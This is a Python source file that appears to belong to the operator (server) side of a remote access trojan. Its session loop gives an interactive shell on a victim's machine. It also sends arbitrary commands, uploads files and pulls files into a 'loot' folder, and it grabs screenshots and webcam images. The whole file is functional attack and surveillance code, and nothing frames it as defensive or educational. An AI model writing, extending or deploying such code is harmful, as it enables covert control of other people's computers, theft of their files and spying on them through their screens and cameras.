import os
import socket

from server.core.protocol import reliable_send, reliable_recv
from server.handlers.file_transfer import upload_file, download_file
from server.handlers.local_commands import handle_help, handle_clear
from server.ui.prompt import print_colored


def run_session(sock, ip, loot_dir):
    import server.core.protocol as protocol
    protocol.recv_buffer = b''

    count = 0

    while True:
        command = input(f'* Shell~{ip}: ').strip()

        if not command:
            continue

        if command == 'help':
            handle_help()
            continue

        if command in ('clear', 'cls'):
            handle_clear()
            continue

        if command.startswith('upload'):
            file_path = command[7:]
            if not os.path.exists(file_path):
                print_colored('[-] File Not Found on Server', 'red')
                continue
            reliable_send(sock, command)
            upload_file(sock, file_path)
            result = reliable_recv(sock)
            print(result)
            continue

        if command.startswith('download'):
            reliable_send(sock, command)
            save_path = os.path.join(loot_dir, command[9:])
            os.makedirs(loot_dir, exist_ok=True)
            download_file(sock, save_path)
            continue

        if command == 'screenshot':
            reliable_send(sock, command)
            save_path = os.path.join(loot_dir, f'screenshot{count}.png')
            os.makedirs(loot_dir, exist_ok=True)
            download_file(sock, save_path)
            count += 1
            continue

        if command == 'webcam':
            reliable_send(sock, command)
            save_path = os.path.join(loot_dir, 'webcam.png')
            os.makedirs(loot_dir, exist_ok=True)
            download_file(sock, save_path)
            continue

        reliable_send(sock, command)

        if command == 'quit':
            break

        try:
            result = reliable_recv(sock)
            print(result)
        except KeyboardInterrupt:
            reliable_send(sock, 'terminate')
            print_colored('\n[-] Command Terminated', 'yellow')
            try:
                sock.settimeout(1.0)
                while True:
                    try:
                        sock.recv(8192)
                    except socket.timeout:
                        break
                sock.settimeout(None)
            except Exception:
                pass
